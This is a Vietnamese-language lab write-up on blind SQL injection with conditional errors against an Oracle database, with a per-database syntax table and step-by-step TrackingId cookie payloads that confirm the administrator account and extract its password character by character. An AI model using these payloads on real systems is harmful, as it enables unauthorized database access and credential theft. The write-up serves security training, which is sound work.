# Blind SQL injection with conditional errors

##### Trang web chứa lỗ hổng SQL injection dạng Blind khi phân tích và thực hiện truy vấn SQL bằng cookie theo dõi (tracking cookie), trong câu truy vấn có chứa giá trị của cookie đã gửi. Kết quả của lệnh truy vấn SQL không được hiển thị, và cũng không còn các thông báo như lab trước. Tuy nhiên, khi câu truy vấn hệ thống thực thi gặp lỗi, sẽ trả về response error. Chúng ta cần khai thác lỗ hổng nhằm tìm kiếm mật khẩu tài khoản administrator, biết rằng trong cơ sở dữ liệu chứa bảng users, gồm cột username và password.

##### Hint: Trang web này sử dụng cơ sở dữ liệu Oracle

Chúng ta có thể khai thác lỗ hổng Blind SQL injection bằng cách kích hoạt các điều kiện xảy ra lỗi trong chính câu truy vấn. Để hiểu rõ hơn về phương pháp tấn công này, chúng ta cùng xem xét và phân tích 2 câu truy vấn sau:

- **`(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'`**
- **`(SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'`**

Từ khóa **CASE** có thể được hiểu giống như cấu trúc rẽ nhánh **switch-case**: Khi điều kiện sau **WHEN** đúng, **CASE** nhận giá trị (1/0), ngược lại nhận giá trị còn lại (sau **ELSE**). Điều thú vị ở đây là khi thực thi biểu thức (1/0) sẽ gây ra lỗi "chia cho 0", có thể khiến response trả về error. Từ đây, trạng thái response có thể giúp chúng ta xác định tính đúng sai của biểu thức trong **WHEN**. Lưu ý, với từng hệ cơ sở dữ liệu có các cú pháp khác nhau:

| database management system | Conditional errors syntax |
| -------- | -------- |
| **Oracle** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **Microsoft** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)` |
| **MySQL** | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

Bài lab này cho ta biết được trang web sử dụng cơ sở dữ liệu Oracle nên ta sẽ thay đổi biến `TrackingID` trong phần **Cookie** có dạng kiểu như sau: **`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`**

- Trước tiên mình thử thêm kí tự `'` và phần `TrackingID` và gửi request đi thì kết quả trả về lỗi

![](https://cdn.discordapp.com/attachments/1124588087931043891/1136682781989158932/image.png)

- Ta sẽ kết hợp sử dụng `TrackingId=xyz'||(SELECT ...)||'` 
    - Toán tử || cho phép nối chuỗi dữ liệu và kết quả truy vấn.
    - Cặp dấu ngoặc đơn () được sử dụng để nhóm các điều kiện hoặc phép tính lại với nhau.

- Ta sử dụng câu truy vấn sau để check xem trong bảng **users** có `administrator` không:
`'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1136685371707625502/image.png)

Yêu cầu trả về Error vậy là có `administrator`.

- Tiếp theo ta sử dụng câu lệnh sau để kiểm tra xem có bao nhiêu kí tự trong `password` của `administrator`:
    - `TrackingId=xxx'||(SELECT CASE  WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`
    - `TrackingId=xxx'||(SELECT CASE  WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`
    - `TrackingId=xxx'||(SELECT CASE  WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`
    ...
Nếu yêu cầu trả về error nghĩa là điều kiện trên đã đúng, tiếp tục thử cho đến khi yêu cầu không trả về error và ta sẽ biết được có 20 kí tự bên trong `password` của `administrator`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1136687191356088442/image.png)

Tiếp theo ta sử dụng câu lệnh sau để tìm ra từng kí tự bên trong `password` của `administrator`:
- `TrackingId=xxx'||(SELECT CASE  WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'`( ta lần lượt so sánh với tất cả bảng chữ cái và chữ số cho đến khi ra yêu cầu Error thì đó chính là 1 kí tự của mật khẩu)
- Tiêp theo thay đổi hàm **SUBSTR(password,2,1); SUBSTR(password,3,1); ...; SUBSTR(password,20,1)** và làm giống như trên ta sẽ có đc mật khẩu và **Solve lab**.

